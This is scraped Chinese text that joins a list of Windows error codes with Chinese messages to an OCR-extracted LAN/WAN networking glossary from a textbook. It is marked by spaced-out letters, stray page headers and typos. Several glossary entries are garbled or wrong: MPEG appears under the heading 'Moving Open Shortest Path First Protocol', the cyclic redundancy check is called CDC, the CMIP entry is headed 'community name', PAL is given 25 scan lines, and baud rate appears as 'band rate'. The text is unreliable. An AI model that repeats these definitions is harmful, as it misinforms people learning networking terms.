0x000e 内存空间不够，无法完成这项操作
0x000f 系统找不到制定的硬盘
0x0010 无法移除目录
0x0011 系统无法将文件移到其他的硬盘
0x0012 没有任何文件
0x0019 找不到指定的扇区或磁道
0x001a 指定的磁盘或磁片无法存取
0x001b 磁盘找不到要求的扇区
0x001c 打印机没有纸
0x001d 系统无法将资料写入制定的磁盘
0x001e 系统无法读取指定的装置
0x001f 连接到系统的某个装置没有作用
0x0021 文件的一部分被锁定
0x0024 开启的分享文件数量太多
0x0026 到达文件结尾
0x0027 磁盘已满
0x0036 网络繁忙
0x003b 网络发生意外的错误
0x0043 网络名称找不到
0x0050 文件已经存在
0x0052 无法建立目录或文件
0x0053 int24失败
0x006b 因为代用的磁盘尚未插入，所以程序已经停止
0x006c 磁盘正在使用中或被锁定
0x006f 文件名太长
0x0070 硬盘空间不足
0x007f 找不到指定的程序
0x045b 系统正在关机
0x045c 无法种植系统关机，因为没有关机的动作在进行中
0x046a 可用服务器储存空间不足，无法处理这项指令
0x047e 指定的程序需要新的Windows版本
0x047f 指定的程序不是Windows或MS-DOS程序
0x0480 指定的程序已经启动，无法再启动一次
0x0481 指定的程序是为旧版的Windows所写的
0x0482 执行此应用程序所需的程序库文件之一毁坏
0x0483 没有应用程序与此项操作的指定文件建立关联
0x0484 传送指令到应用程序发生错误
0x04b0 指定的装置名称无效
0x05a2 窗口不是子窗口
0x05aa 系统资源不足，无法完成所要求的服务
0x05ab 系统子还不足，无法完成所需要的服务
0x05ac 系统资源不足，无法完成所要求的服务
0x06b9 资源不足，无法完成操作 
术语表
下载
术语表
? 1 0 0 B a s e - V G或者1 0 0 V G - A n y L A N—使用需求优先权传输数据包的一种速率为
1 0 0 M b p s的通信技术。
? 1 0 0 B a s e - X—1 0 0 M b p s的快速以太网标准，使用C S M A / C D访问方法进行通信，具体说
明见标准IEEE 802.3u。
A
? access server (访问服务器)—访问服务器是将同步设备和异步设备连接到网络、并为
同步通信和异步通信提供路由技术的一个单元。
? active hub (有源电缆接头)—有源电缆接头是在星形拓扑结构中连接结点的一种网络
传输设备，每当数据信号通过集线器时，可以对其进行重建、重定时和放大。
? Address Resolution Protocol (地址解析协议, ARP)—一种基于T C P / I P的协议，利用该
协议，发送结点可以确定接收结点的M A C地址。
? American National Standards Institute (美国国家标准协会, ANSI)—这是致力于为各种
产品(包括网络设备)建立标准的组织。
? American Standard Code for Information Interchange ( 美国信息交换标准码, ASCII)—
一种8位字符编码的方法，由9 6个大写字母、小写字母和数字另加3 2个非打印字符组成。
? analog (模拟)—模拟是一种可以连续变化的各种类型的传输，如正电压和负电压的电
波。
? A p p l e Ta l k—对等协议，用于网络上多台M a c i n t o s h计算机之间的通信。
? application-specific integrated circuit (专用集成电路, ASIC)—在芯片上定制的集成电
路，其中包括特殊的逻辑功能，如快速路由逻辑。
? Asynchronous Transfer Mode (异步传输模式, AT M )—采用信元、多通道和交换在同一
网络上发送音频、视频和数据传输的传输方法。
? ATM attached device (AT M附属设备)—将数据流转换为AT M信元流，或者将AT M信元
流转换成数据流的设备。
? ATM Forum (AT M论坛)—与ITU T一起，致力于AT M的L A N和WA N应用规范制定的
硬件供应商、电信服务提供商以及用户的联盟。
? ATM permanent virtual circuit (AT M永久虚拟电路, PVC)—一个专用电路，在两个指
定端点之间具有预先配置的路径一个固定分配的带宽。
? ATM switch (AT M交换器) — 一个交换器，以AT M分层通信的方式对信元传输进行操
作。
? ATM switched virtual circuit (AT M转换虚拟电路, SVC)—为分立的通信任务建立并使
用的电路，当该任务完成时，则拆卸该电路。
? attachment unit interface (连接单元接口, AUI)—是一种网络接口，用来将同轴电缆、
双绞线或光纤主干电缆连接到网络结点如集线器、交换机或工作站上。接口由连接器、
电缆、接口回路和电气特性的A U I标准组成。
? attenuation (衰减)—当信号沿通信介质从源(传输结点)发送到接收结点时，丢失的信
号量。
? Audio Video Interleave (音频视频交错, AV I )—AV I是一种声频和视频文件格式，为
Microsoft Windows 3.1或更高环境下的应用而开发。AV I对那些准备复制为短小的“片”
的视频和音频数据进行隔行扫描。 
B
? backbone (主干)—一种高容量的通信介质，用于连接同一层、不同层或跨越长距离的
网络。
? backbone cabling (主干布线)—根据E I A / T I A - 5 6 8标准的定义，主干电缆为在网络设备
室、楼层和建筑物用的电缆。
? band rate (波特率)—波特率衡量数据传输速率，用来描述老式调制解调器的速度，在
一次信号振荡时发出一个数据位。
? bandwidth (带宽)—带宽指通信介质的传输能力，通常以每秒多少位(数据传输)或赫兹
(对于数据、音频和视频传输)来衡量，并由最大传输能力减去最小传输能力决定。
? baseband (基带)—基带是一种传输类型。在基带传输中，通信介质(如电缆)的整个通
道容量只被一个数据信号使用，从而在一定时间只有一个结点用于传输。
? Basic Rate Interface for ISDN (ISDN基本速率接口, BRI)—一种I S D N接口，由三个信
道组成。其中两个6 4 K b p s的信道用于传输数据、语音、视频和图形。第三个1 6 K b p s信
道用于传输信令。
? batch (批处理)—不需要用户或其他计算机系统干预的一个接一个的一系列处理过程。
处理大量数据或一系列复杂功能的计算机的维护工作通常采用这种方式，而且这种工作
通常是在夜间进行的。
? bayonet nut connector (同轴电缆接插件, BNC)—用于细同轴电缆，有一个卡销一样的
套。Male BNC有两个旋钮，插在female BNC的环形槽中。连接时，两个接插件要绞在
一起。
? beaconing (信标)—信标是令牌环网中的错误状态，表明有一个或一个以上的结点出现
操作异常。
? bidirectional interpolation (双向插补)—双向插补是一种视频压缩技术，在序列中影象
的前后影象里都存在与当前影象相同的部分，可以通过创建指向这部分的指针来压缩
帧。
? bits per second (比特/秒, bps)—比特/秒是每秒发送的二进制位( 0或1 )的个数。
? bridge (网桥)—网桥是将使用相同的访问手段的不同局域网段连接在一起的网络传输
设备。例如，使用网桥将一个以太局域网连接到另一个以太局域网，或将令牌环局域网
连接到另一个令牌环局域网上。
? bridge protocol data unit (网桥协议数据单元, BPDU)—B P D U是网桥所用的专门的帧，
用来彼此间交换信息。
术语表计计295
? broadband (宽带)—这种传输中，通信介质上有多个传输通道，允许在同一时刻有多
个结点进行传输。
? broadband ISDN (宽带ISDN, B-ISDN)—当前正处于开发之中，该技术可以提供
1 5 5 M b p s或者更高的数据传送速率。
? broadcast storm (广播扰动)—当大量的计算机或设备要同时传输时，或者当计算机或
设备都要进行重复传输，网络流量超负荷就会引起网络带宽饱和，称之为广播扰动。
? brouter (桥式路由器)—桥式路由器是充当网桥或路由器的一种网络设备，具体是充当
网桥还是路由器，则要根据它转发给定协议的方法而定。
? buffering (缓存)—缓存是一种设备，例如交换机，在存储器中临时存储信息的能力。
? bus (总线)—总线是计算机中用来传输数据的一条路径，例如，在C P U和连接在计算
机上的外设之间的通道。
? bus topology (总线结构)—总线结构是从一台P C或文件服务器连接到另一台的网络设
计，就像链上的链接那样。 
C
? cable plant (电缆线路)—用来构成网络的所有的通信电缆的数量。
? cableco—有线电视公司，如T C I。
? carrier sense (载波侦听)—载波侦听是检验通信介质如电缆等以确定电压级别、信号转
换等的过程，通过载波侦听可以说明网络上是否出现了载有数据的信号。
? Carrier Sense Multiple Access with Collision Detection (带有冲突检测的载波侦听多路存
取, CSMA/CD)—C S M A / C D是以太网中使用的一种网络传输控制方法。它通过检查包
冲突来调整传输。
? cell (信元)—是用于高速传输的格式化数据单元，经常用在AT M中。
? cell switching (信元交换) — 一种使用T D M和虚拟通道的转换方式，在每一个T D M时
间片的开头都放置一个简短的指示器或虚拟通道标识符。
? Challenge Handshake Authentication Protocol 难题握手鉴定协议( C H A P )— 用于对口令
加密的协议，例如在一个WA N上传输的服务器帐户口令。
? channel bank (信道组)—信道组是在一个集中的位置组合了通信信道(如T- 1 )的大规模
多路转接器。
? channel service unit (通道服务器, CSU)—这种设备是在网络设备(如路由器)和T载波线
路之间的一个物理接口。
? circuit switching (电路交换)—电路交换技术是一种网络通信技术，采用专用的信道在
两个结点间传输信息。
? Classical IP over ATM (AT M上的经典IP) — AT M上I P的传输，一个严格集中于I P支持
的技术。
? Classless Interdomain Routing (无类别域间路由, CIDR)—一种新的I P编址方法，该方
法忽略了地址的类别设计，在点分十进制地址的后面使用一条斜线，用以指明可用地址
的总数目。
? coaxial cable (同轴电缆)—同轴电缆是一种网络电缆介质，由被绝缘层包围的铜芯组
成。绝缘层又被另外的传导材料如编织导线包围，传导材料又由外层的绝缘材料覆盖。
? collision (冲突)—冲突是在以太网上同时检测到两个或多个包时的状态。
? community name (公用名)—网络代理和网络管理工作站使用的一个口令，其作用是不
让它们的通信被未经授权的工作站或者设备轻易截取。
? community name (公共管理接口协议, CMIP)—该协议是O S I网络管理标准的一部分，
用以收集网络性能数据。
? Compressed Serial Line Internet Protocol (压缩串行线路互连网协议, CSLIP)— S L I P远
程通信协议的扩展，能够提供比S L I P更快的吞吐量。
? computer network (计算机网络)—计算机网络是由通信电缆或无线电波链接的计算机、
打印机设备、网络设备和计算机软件系统。
? concentrator (集中器)—集中器是可以让多个输入和输出同时活动的设备。
? connection-oriented service (面向连接的服务)—这是在L L C子层和网络层间进行的
Type 2操作，提供了多种途径来保证接收结点成功地接收到了数据。
? connectionless service (无连接服务)—无连接服务也就是常说的Type 1操作，是L L C子
层和网络层间的服务，但是这里不能检测数据是否已经确实到达了接收结点。
? current-state encoding (当前状态编码)—这是一种数字信号编码方法，这里，对某信号
状态分配一个二进制值，例如+ 5 v电压为二进制值1，0 v为二进制值0。
? cut-through switching (开通式交换)—通过开通式交换这种交换技术在整个帧到达之前
来转发帧的一部分。
? cyclic redundancy check (循环码校验, CDC)—C D C为一种错误校验方法，这种方法中
要计算包含在帧中的整个信息域的大小，计算出来的值由发送结点的数据链接层插入到
靠近帧尾的位置，并又接收结点的数据链接层进行校验，以确定是否出现了传输错误 
D
? data circuit equipment (数据电路设备, DCE)—在X . 2 5网络上，D C E指的是一个分组交
换机或者P D N访问设备。
? data link connection identifier (数据链路连接标识, DLCI)—在帧中继网络上用以标识
单个的虚拟连接。
? Data Link Control (数据链路控制, DLC)—设计用于与一个I B M大型机或微型机通信的
协议，它使用S N A通信。
? data service unit (数据服务器, DSU)—与C S U共同使用的一种设备，用于T载波线路上
的通信。D S U为接收网络而转换在线路上传输和接收的数据。
? data terminal equipment (数据终端设备, DTE)—在X . 2 5网络上，D T E是指运行在分组
交换网络上的终端、工作站、服务器和主计算机等。不管实际使用的设备到底是什么，
有时都将D T E设备称为终端。
? data warehouse (数据仓库)—一种数据库访问技术，这种技术将一个主机数据库(例如，
大型机上的数据库)复制到另外一个数据库服务器上，目的是为了能够在不中断主机数
据库的情况下创建报表或者浏览数据，一般情况下可以允许使用点击型报表编写工具。
? datagram (数据报)—X . 2 5的一种传输模式，在这种模式下，没有使用特殊的通信信道，
常常导致数据不能以它们发送时的顺序到达，因为每一个数据报可能会沿不同的路径到
达目的地。
? demand priority (需求优先权)—一种数据通信技术，这种技术可以直接将信息包传送
给目标结点，在传输过程中只经过一个集线器，无需经过其他的网络结点。
? dense wavelength division multiplexing (密集波分多路复用, DWDM)—一种新出现的多
路复用技术，该技术使用单模光纤，可以在一条光缆上建立多个路径同时进行数据传输。
? digital (数字式)—这是一种传输方法，其中不同的信号级都用二进制表示，如二进制0
和1分别代表0 v和+ 5 v。
? digital subscriber line (数字用户线路, DSL)—一种使用高级调制技术的技术，该技术
可以在用户和电话公司之间通过已有的电信网络形成高速的网络连接，其通信速度可以
高达6 0 M b p s。
? discovery (发现)—发现是路由器采用的一个过程，包括采集诸如网络上有多少个结点
以及结点的位置等信息。
? Distance Vector Multicast Routing Protocol (距离向量广播路由协议, DVMRP)—
D V M R P是一种与R I P共同工作的多点广播(也称多点传送)协议，可确定哪个工作站被预
定给了多点传送。
? Domain Name Service (域名服务, DNS)—一种T C P / I P应用协议，该协议可以将计算机
的域名转换为I P地址，或者将I P地址转换为域名。
? dotted decimal notation (点分十进制表示法)—一种编址技术，该技术将四个8位字节，
例如1 0 0 0 0 11 0 . 11 0 111 1 0 . 11 0 0 1 0 11 . 0 0 0 0 0 1 0 1 ，转换成十进制表示( 例如，
1 3 4 . 2 2 2 . 1 0 1 . 0 0 5 )，用以标识网络和网络上的单个主机。
? d r i v e r (驱动程序)—驱动程序是一种软件，可使计算机与N I C、打印机、显示器和硬盘
驱动器进行通信。每一个驱动程序都有其特定的目的，例如，处理以太网通信。
? dynamic addressing (动态编址)—一种编址方法，在这种方法中，无需网络管理员将I P
地址“硬编码”在设备的网络配置中便可以实现I P地址的分配。
? Dynamic Host Configuration Protocol (动态主机配置协议, DHCP)—一种网络协议，通
过D H C P，服务器可以自动地将一个I P地址分配给其网络上的某个设备。
? dynamic routing (动态路由)—在动态路由这种路由进程中，路由器不停地检查网络的
配置，自动更新路由表，并自己来决定如何路由包。
E
? electromagnetic interference (电磁干扰, EMI)—电磁干扰是马达等电力设备引起的磁力
场产生的信号干扰。
? electronic data interchange (电子数据交换, EDI)—使用电子方法在计算机或电话网络
上传输商业、组织和个人数据。
? Electronic Industries Alliance (电子工业联合会, EIA)—这是发展网络布线标准和电子
接口标准的标准化组织。
? encapsulation (封装)—封装是在网络间转换帧的过程。在这一进程中，要将一种类型
的网络的数据帧放入另一网络使用的头部，使得新的头的作用如同发信时的信封。
? enterprise network (企业网)—企业网是L A N、M A N或WA N的组合，为计算机用户提
供一系列计算机和网络资源，以完成各种工作。
? Ethernet (以太网)—以太网是使用C S M A / C D访问方法进行网络数据传输的一种传输系
统。以太网一般是通过总线或总线—星型拓扑结构实施的。
? Extended Binary Coded Decimal Interchange Code (扩充二进制编码十进制交换码,
E B C D I C )—这是一种主要用于I B M大型机的字符编码技术，对2 5 6个字母、数字和特
殊字符组成的字符集进行8位编码。
? E x t r a n e t—一种用WA N链路连接两个或者多个I n t r a n e t所形成的网络。
F
? farm (群)—放置在同一个地方的一组计算机主机(例如大型机)或服务器或两者都有，
例如放置在一个机房内。
? Fast Ethernet (快速以太网)—传输速度在1 0 0 M b p s的以太网通信，其详细说明见标准
IEEE 802.3u。
? fat pipe (粗管)—用于网络主干(如在建筑物的楼层间)以进行高速通信的光纤电缆。
? Fiber Distributed Data Interface (光纤分布式数据接口, FDDI)—F D D I是一种光纤数据
传输方法，采用的拓扑结构为双环拓扑，其传输速度可达1 0 0 M b p s。
? f i b e r-optic cable (光纤电缆)—光纤电缆是一种通信电缆，由两个或多个玻璃或塑料光
纤芯组成，这些光纤芯位于保护性的覆层内，由塑料P V C外部套管覆盖。沿内部光纤进
行的信号传输一般使用红外线。
? File Transfer Protocol (文件传输协议, FTP)—一种T C P / I P应用协议，该协议以批数据
流的方式传输文件，是一种在I n t e r n e t上广泛使用的协议。
? firewall (防火墙)—防火墙是用来保护数据免受外界访问的软件或硬件，也可以防止网
络中数据泄露到外面。
? firmware (固件)—固件是一种存储在R O M等设备的芯片上的软件。
? flow control (流控制)—流控制过程用来确保设备发送信息时的速度不高于接收设备的
接收速度。
? fractal image compression (不规则图象压缩)—不规则图象压缩是一种视频压缩技术，
利用不规则图象片、复制图象和映射的特性来压缩帧。
? frame (帧)—有时“帧”一词可以与“包”交换使用，但帧指的是网络上传输的数据单
元，其中包含与开放系统互连( O S I )的数据链接层(即第2层)相应的控制信息和地址信息。
? frame relay (帧中继)—一种通信协议，使用分组交换和虚拟电路技术进行分组传输，
该技术通过将大量的差错检验功能留给中间结点，可以获得较高的数据传输速率。
? frequency-division multiple access ( 频分多路访问技术, FDMA)—频分多重访问技术在
一种通信介质上通过给每一个信道确立不同的频率来创建不同的信道。
? full-duplex (全双工)—全双工是指可以同时发送、接收信号的能力。
G
? gateway (网关)—网关是一种网络设备，可使不同类型的网络间相互通信，如在复杂
的协议间或不同的E- m a i l系统间进行通信。
H
? half-duplex (半双工)—半双工是指可以发送接收信号、但不能同时进行的能力。
? hop (跳)—跳是帧或包从一个网络向另一个网络点对点的运动。
? horizontal cabling (水平布线)—根据E I A / T I A - 5 6 8标准的定义，水平布线为在同一工作
区域中连接工作站和服务器的布线。
? host (主机)—主机是具有操作系统的，多台计算机可同时访问其文件、数据和服务的
计算机(包括大型机、小型机、服务器或工作站)。程序和信息可在主机上进行处理，或
下载到访问计算机(客户机)上来处理。
? hub (集线器)—集线器是将各个单独的电缆段或单独的L A N连接在一起成为一个网络
的中央设备。
? hybrid fiber/coax (混合光纤/同轴, HFC)电缆—这种电缆由电缆护套组成，电缆护套中
包含着光纤和铜电缆的组合。
I
I
? impedance (阻抗)—阻碍电流流动的总值。
? Institute of Electrical and Electronics Engineers (电气电子工程师协会, IEEE)—这是由
一群科学家、工程师、技术人员和教育家组成的组织，在开发网络布线和数据传输标准
方面起着领导作用。
? Integrated Services Digital Network (综合业务数字网, ISDN)—一种在电话线上传输数
据服务的网络标准，当前的实际速率为1 . 5 3 6 M b p s，理论上可以达到6 2 2 M b p s的传输速
率。
? Integrated Services Digital Network (综合服务数字网, ISDN)—I S D N是在电话线上用
信道的组合来传递音频、数据和视频服务的WA N技术。
? International Organization for Standardization (国际标准化组织, ISO)—I S O是一国际组
织，致力于建立通信和网络标准，其最为突出、广为人知的贡献是建立了网络协议标
准。
? International Telecommunications Union (国际通信联盟, I T U )—I T U是国际上致力于规
定远程通信标准的组织，例如，它为调制解调器和WA N通信制订了标准。
? Internet Engineering Task Force ( Internet工程任务组, IETF)—I E T F是I S O C的左膀右
臂，致力于与Internet 相关的技术问题。
? Internet Function (互连功能, IWF) — 一个标准，为在AT M上实现帧中继提供重新映射
及封装功能。
? Internet Group Management Protocol (互联网分组管理协议, IGMP)—在多点传送中使
用的协议，其中含有接收用户的地址，服务器使用它来通知路由器哪一个工作站属于多
点传送组。
? Internet —Internet 是由许许多多网络设备和多种通信方法链接的成千上万的小型网络
的集合。
下载
? Internet Packet Exchange (网间包交换, IPX)— 由N o v e l l开发的用在它的N e t Wa r e文件
服务器操作系统上的协议。
? Internet Protocel(Internet 协议， I P )—该协议与T C P或U D P结合使用，通过采用点分
十进制编址，使包到达本地或远程网络上的目标地点。。
? Internet Society (Internet 协会, ISOC)—I S O C是一家非盈利的国际组织，主办会议和
出版物，并监督Internet 标准的执行。
? internetworking (网络互连)—网络互连是将相同或不同类型的网络连接在一起以便相
互通信的过程。
? I n t r a n e t—某个公司组织的私有网络，在该网络中，可以和I n t e r n e t一样使用相同的基
于We b的网络工具，但是对公众的访问有严格的限制。I n t r a n e t通常由一个L A N上的一个
或者多个子网或者V L A N组成。
J
? jamming (阻塞)—交换机使用的一种数据流量控制技术，用来指示由于大量数据引起
的交换机过载。在这种方式中，交换机通过倍增载波信号来模拟冲突。
? jitter (抖动)—抖动是网络上延迟不定的具体表现，抖动会在声频重放时引起明显的错
误，如播放声频时的杂音等。
? Joint Photographic Experts (联合图像专家组, JPEG)压缩—J P E G压缩是使用有失真压
缩技术的压缩标准，由I S O和I T U - T专为静态图像制订 
L
? LAN Emulation (LAN仿真, LANE)—用于使AT M适应于以太网的技术，它创建一个多
点传送的网络，使得预先配置的以太网结点组能够接收传输。
? LAN emulation (局域网仿真)—局域网仿真是一种网络集成方法，用以在相连的L A N
上格式化所有的包以与AT M通信单元(信元)的外型匹配。
? latency (延迟)—延迟是指网络信息从传输设备发送到接收设备所用的时间。
? line-to-line (视线传输)—视线传输是一种无线电信号传输的类型，其中，信号从一点
向另一点传输，而不是在大气中弹跳，从而可以跨越国家或洲的界限。
? local area network (局域网, LAN)—局域网是一系列互连的计算机、打印设备和其他计算
机设备，它们之间共享硬件和软件资源。局域网通常仅限于给定办公地点、楼层或大楼中。
? local bridge (本机桥)—本机桥是连接临近网络的网络设备，可以用来将网络的一部分
分段以缓解网络流量繁忙的问题。
? local management interface extension (局部管理接口扩展)—添加在帧中继帧上的扩展，
可以提供附加的功能，例如多点传送。
? local router (本地路由器)—本地路由器是在同一座大楼或临近的大楼之间(例如在同一
商业区)连接网络的一种路由器。
? Logical link control (逻辑链路控制, LLC)—这是O S I模型的数据链接子层，用来发起
结点间的通信链接，确保链接不会无意识地中断。
? lossy compression (有失真压缩)—有失真压缩是一种压缩图像的方法，它删除一定百
分比的颜色，使得当图像解压缩时，肉眼不会观察到颜色中细微的变化。
? low earth orbiting satellites (低轨卫星, LEO)—一种通信卫星网络，这种通信卫星距离
地面的高度大约在4 3 5到1 0 0 0英里之间。
M
? Management Information Base (管理信息库, MIB)—存储网络性能信息的数据库，该
数据库被存放在网络代理上，可以从网络管理工作站上进行访问。
? Manchester encoding (曼彻斯特编码)—这是一种状态转换编码形式，其中，从低向高
的转换为二进制0，高向低转换为二进制1。
? media access control (介质存取控制, MAC)—这是数据链接层的子层，用来检查网络
帧中包含的地址信息，并控制同一网络上设备共享通信的方式。
? meshed architecture (网络体系)—一种网络体系，其中有多个备用网络路径，如果一
个路径失效，发送设备会自动地重新路由到另外一个路径，不需要用户干预。
? message switching (报文交换)—这种交换方法将数据从一点发送到另一点，每一个中间
结点都可存储数据、等待闲置的传输信道，并在到达目的地后，将数据提交给下一个点。
? metric (度量)—度量是由路由器计算出来的，反映了有关特定传输途径的信息，如路
径长度、下一跳的负载、可用的带宽和路径可靠性等。
? metropolitan area network (城域网, MAN)—城域网是在一大型城市或地区链接多个
L A N的网络。
? Microcom Network Protocol (Microcom网络协议, MNP)—M N P是一套调制解调器的服
务级别，可以提供有效的通信、错误校验、数据压缩和高输入输出总和等能力。
? modem (调制解调器)—调制解调器将计算机输出的数字信号转换为电话线路可以传输
的模拟信号，然后在接收端将输入的模拟信号转换为计算机可以理解的数字信号。
? Moving Open Shortest Path First Protocol (运动图像专家组, MPEG)压缩—M P E G是由
I S O中的M P E G建立的视频压缩标准。
? multicast (多点传送)—一种传输方法，在这种方法中，服务器将需要一个特定多媒体
传输的用户组合成一组。每个数据流只发送一次，但是到达多个地址，而不是分别给每
个地址发送一次数据。
? Multicast Open Shortest Path First Protocol (广播开放最短路径优先协议, MOSPF)—
M O S P F是一种多点广播路由协议，在为多点广播传输寻找从源到目标的最短路径时，
与O S P F相仿。
? multiple system operator(MSO)—这是提供WA N或Internet 服务的一家有线电视公司。
? multiplexer (多路器)—多路器是一种转换器，将一种通信介质分成多个通道，从而结
点可以同时进行通信。当信号被多路传送时，在另一端也必须要多路转换。
? Multiprotocol over ATM (AT M上的多协议, MPOA)—一种通信技术，使得多协议的通
信量能够在AT M上选择路由。
? multistation access unit (多站访问部件, MAU)—M A U是将许多令牌环结点链接到一个
在物理上很像星型结构的拓扑结构上的中央集线器，但在M A U中，包在逻辑上是以环
形结构进行传输的。
302计计局域网/广域网的设计与实现
下载
? multistation access unit (多站访问部件, MAU)—多站访问部件将令牌环结点链接到一
个物理上像星形但数据信号在逻辑的环形上传输的一种拓扑结构上。
N
? National Television Standards Committee (国家电视制式委员会, NTSC)—N T S C是为电
视广播传输建立标准的一个组织。由N T S C制订的电视信号传输标准利用了5 2 5条垂直扫
描线，每秒可传输3 0个帧。
? NetBIOS Extended User Interface (NetBIOS扩展用户接口, NetBEUI)— 由I B M在8 0年
代中期开发，此协议集成了N e t B I O S，用于在网络上进行通信。
? Network Basic Input/Output System (网络基本输入/输出系统, NetBIOS)— 将软件与网
络服务相接口的方法，包括提供为工作站和服务器提供一个网络命名惯例。
? Network Control Protocol (网络控制协议, NCP)—A R PA N E T网络协议，其使用要早于
T C P / I P，但是其功能逐渐被T C P / I P取代。
? Network Device Interface Specification (网络驱动程序接口规范, NDIS)—由微软为网
络驱动器开发的一系列标准，使得一个N I C和一个或多个协议进行通信成为可能。
? Network File System (网络文件系统, NFS)Protocol—T C P / I P文件传输协议，该协议使
用记录流而不是使用成批文件流来传输信息。
? Network Node Interface (网络结点接口, NNI)—一个AT M接口，用于两个AT M交换机
之间的连接，有时候也称为网络到网络的接口。
? network traffic (网络信息流通量)—网络信息流通量是指给定时间内，网络上传输的包
的数量、大小和频率。
? Next Hop Resolution Protocol (下一转发分辨协议, NHRP)— 一个协议，当多个网络通
过AT M连接时，它使得一个网络上的发送结点能够判断出要使用的数据链路层的地址，
以便到达另一个网络上的目标结点。
? Open Database Connectivity (开放数据库互连, ODBC)—由微软开发的一种数据库访问
规则和过程，其目的是作为所有类型的关系数据库的一个标准。
? Open Datalink Interface (开放数据链路接口, ODI)— 由Novell NetWa r e使用的驱动器，
用于在多个网络上传输多个协议。
? Open Document Architecture (开放文档体系结构, ODA)—O D A是I S O的标准，是为综
合包含文本、图像、声音和其他表示模式的专门格式化的文档而制订的。
? Open Shortest Path First (开放最短路径优先, OSPF)—开放最短路径优先是路由器采用
的一种路由协议，用来与其他路由器交流有关到其他结点的直接链接等信息。
? Open Systems Interconnection (开放系统互连, OSI)—O S I由I S O和A N S I开发，是一个7
层的模型，为网络上的硬件和软件通信提供一种体制。
术语表计计303
304计计局域网/广域网的设计与实现
下载
? packet (包)—包是为方便在网络上传输而格式化了的数据单元，其中含有与O S I网络
层(即第3层)相应的控制信息及其他信息。
? packet assembler/disassembler (分组组装/拆装器, PA D )—一种将分组封装为X . 2 5格式
并且添加X . 2 5地址信息的设备。当分组到达其目的L A N之后，PA D会把X . 2 5格式信息去
掉。
? packet radio (无线电分组通信)—以短脉冲串的形式通过无线电波传输带有数据的包的
过程。
? packet switching (包交换)—包交换是一种数据传输技术，它在两个传输结点之间建立
起一个逻辑信道，并不停地在许多不同的路径之间发现到达目的地的最好的路由路径。
? partition (分区)—分区即在段的一部分出现故障时关闭电缆段。
? passive hub (无源插孔)—无源插孔是用来以星形拓扑结构连接结点的一种网络传输设
备，当数据信号通过集线器从一个结点传到另一个结点时，不执行信号放大。
? Password Authentication Protocol (口令验证协议, PA P )—当在一个WA N上访问一个服
务器或宿主计算机时，用于验证帐户口令的协议。
? peer protocols (对等协议)—用来使发送结点的O S I模型的各层与相应的接收结点层进
行通信的协议。
? permanent virtual circuit (永久虚拟电路, PVC)—一种通信信道，一直处于连接状态，
不管该结点是否在进行通信。
? phase alternation line (逐行倒相, PA L )—PA L是一种电视传输标准，主要用在非洲、欧
洲、中东和南美洲，它采用了2 5条垂直扫描线，每秒传输2 5帧。
? plain old telephone service (简易老式电话业务, POTS)—规则的语音级电话业务。
? plenum area (高压电缆)—这是一种用特氟纶做套的电缆，由于它在燃烧时不会放射有
毒的气体，所以经常用在高压地区。
? plenum area (高压地区)—高压地区是封闭的地区，其间的大气压要比外界的气压高，
尤其在燃烧时更是如此。建筑物中的高压地区经常可以发展到多个房间或在整个楼层中
蔓延，高压地带包括通风和加热管道。
? Point-to-Point (点到点协议, PPP)— 一个广泛使用的远程通信协议，支持I P X / S P X、
N e t B E U I以及T C P / I P通信。
? power budget (功率分配)—对于光纤电缆通信，功率分配是发送功率和接收器的敏感
性之间的差别，以分贝来衡量。这是信号可以被发送并完好地接受所需要的最小的发送
器功率和接收器敏感性。
? predicted encoding (预测编码)—预测编码是一种视频压缩技术，帧的前一帧具有与其
相同的图像部分，可创建指向这一部分的指针来压缩帧。
? Primary Rate Interface ISDN (ISDN主速率接口, PRI)—I S D N的一种接口，由多个速率
为1 . 5 3 6 M b p s的交换式通信组成。
? primitive (原语)—原语是将O S I协议栈某层的信息传输到另一层(如从物理层传到数据
链接层)的命令。
? Private Network-to-Network Interface(私有网络到网络接口, PNNI)—一个AT M路由选
择协议，最通常使用在与S V C的连接上。
? private automated branch exchange (专用自动交换机, PA B X )—专用自动交换机是一种
专用的自动的电话系统，，但是仍然保留有人工电话总机控制板。
? private branch exchange (专用分组交换机, PBX)—专用分组交换机是一种专用的电话
系统，可以与当地的电话系统相连，也可以不连，它也有一个人工的电话总机控制板。
? private branch exchange (自动用户交换机, PA X )—自动用户交换机是一种完全自动的
(没有电话总机控制板)的专用电话系统。
? promiscuous mode (混合模式)—在混合模式中，在向网络其他连接的段发送帧之前，
网络设备就可以读取帧的目标地址。
? protocol (协议)—协议是人们建立的一套用以指定网络数据如何格式化为包、如何传
输、在接收端如何翻译的标准。
? protocol data unit (协议数据单元, PDU)—在同一个O S I协议栈的各层之间传输的信息。
? Protocol Independent Multicast (协议无关广播, PIM)—协议无关广播是一种多点传送
路由协议，与采用O S P F或R I P为主路由协议的网络兼容。
? public switched telephone network (公用电话交换网络, PSTN)—语音级电话服务。
Q
? Quality of Service (服务质量, QoS)—这是衡量网络传输、质量输入输出总和和可靠性
的手段。
R
? radio frequency interference (无线电频率干扰, RFI)—因为电气设备发射的无线电波频
率与网络信号传输使用的频率相同而引起的信号干扰为无线电频率干扰，也称射频干
扰。
? R e a l - Time protocol (实时协议, RT P )—实时协议是为实时多媒体应用程序如视频会议
等开发的多点传送协议。
? R e a l - Time Transport Control Protocol (实时传输控制协议, RT C P )—实时传输控制协议
与RT P协同工作，在多点广播传输上提供专门的控制。，如在缺少带宽时，将彩色降级
为单色。RT C P也提供管理信息。
? redirector (转向器)—转向器是一种通过应用层使用的服务，用来识别并访问其他计算
机。
? redundancy (冗余)—提供额外的电缆和设备来保证计算机和计算机系统能够连续地工
作，甚至在一个或多个网络或计算机单元出现故障时仍能正常工作。
? regional Bell operating company, (RBOC)—这是为指定地区提供电话业务的电信公司。
? remote bridge (远程网桥)—远程网桥是穿越同一个城市、在城市之间、在州之间连接
网络以创建一个大网络的设备。
? Remote Network Monitoring (远程网络监控, RMON)—一种利用远程网络结点(例如工
作站或者网络设备)执行网络监控的标准，其功能包括收集信息进行网络协议分析。可
以在网络的远程部分设立监测器，例如中间可以经过一些网桥或者路由器。
? remote router (远程路由器)—远程路由器是跨越极广的地理区域(如城市之间、州之间
和国家之间)将网络连到WA N中的网络设备。
术语表计计305
? repeater (转发器)—转发器是将包放大并重新定时、以让它沿所有连接在转发器上的
输出电缆段发送的网络传输设备。
? Request for Comment (请求注释, RFC)—请求注释是为推动网络互连、Internet 和计算
机通信而发布的信息文档。Internet 工程组( I E T F )负责对R F C进行分类和管理。
